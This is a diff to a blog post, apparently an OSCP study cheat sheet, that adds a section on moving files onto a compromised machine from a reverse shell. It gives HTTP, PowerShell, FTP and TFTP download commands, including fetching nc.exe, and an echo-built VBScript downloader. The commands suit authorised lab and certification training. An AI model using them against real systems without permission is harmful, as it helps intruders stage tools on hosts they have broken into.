@@ -1,7 +1,7 @@
 ---
 title: OSCP Cheat Sheet
-date: 2020-06-21 15:30:00
-description: Most commonly used commands to help with the OSCP certification.
+date: 2020-06-28 15:30:00
+description: Originally created June 21, 2020
 featured_image: '/images/blog/oscp/oscp.jpg'
 ---
 
@@ -65,3 +65,80 @@ The Simple Network Management Protocol (SNMP) is based on UDP, and is suspectibl
 
 	sudo nmap -sU --open -p 161 <TARGET> 
 
+
+## File Transfers
+
+### HTTPS
+
+This is probably the easiest way to transfer a file so I usually try this first. If this doesn't work, then I'll move down the list.
+
+	# In Kali
+	python -m SimpleHTTPServer 80
+
+	# In reverse shell - Linux
+	wget <HOST> /file
+
+	# In reverse shell - Windows
+	powershell -c "(new-object System.Net.WebClient).DownloadFile('<HOST>/file.exe','C:\Users\user\Desktop\file.exe')"
+
+### FTP 
+
+Windows has a built in FTP client at C:\Windows\System32\ftp.exe so this option *should* work. If not, there are other options down below.
+
+	# In Kali
+	python -m pyftpdlib -p 21 -w
+
+	# In reverse shell
+	echo open <HOST> > ftp.txt
+	echo USER anonymous >> ftp.txt
+	echo ftp >> ftp.txt 
+	echo bin >> ftp.txt
+	echo GET file >> ftp.txt
+	echo bye >> ftp.txt
+
+	# Execute
+	ftp -v -n -s:ftp.txt
+
+### TFTP
+
+Use TFTP when completing a file transfer on older Windows versions like Windows XP and Windows Server 2003 as Powershell may not be installed. 
+
+	# In Kali
+	atftpd --daemon --port 4444 /tftp
+
+	# In reverse shell
+	tftp -i 10.10.10.10 GET nc.exe
+
+### VBScript
+
+When FTP/TFTP doesn't work, we can use this to download files to the target's machine. The `echo` command will write out a **wget.vbs** script that acts as a HTTP downloader.
+
+	# In reverse shell
+	echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+	echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+	echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+	echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+	echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+	echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+	echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+	echo Err.Clear >> wget.vbs
+	echo Set http = Nothing >> wget.vbs
+	echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+	echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+	echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+	echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+	echo http.Open "GET",strURL,False >> wget.vbs
+	echo http.Send >> wget.vbs
+	echo varByteArray = http.ResponseBody >> wget.vbs
+	echo Set http = Nothing >> wget.vbs
+	echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+	echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+	echo strData = "" >> wget.vbs
+	echo strBuffer = "" >> wget.vbs
+	echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+	echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+	echo Next >> wget.vbs
+	echo ts.Close >> wget.vbs
+
+	# Execute
+	cscript wget.vbs <HOST>/file.exe file.exe
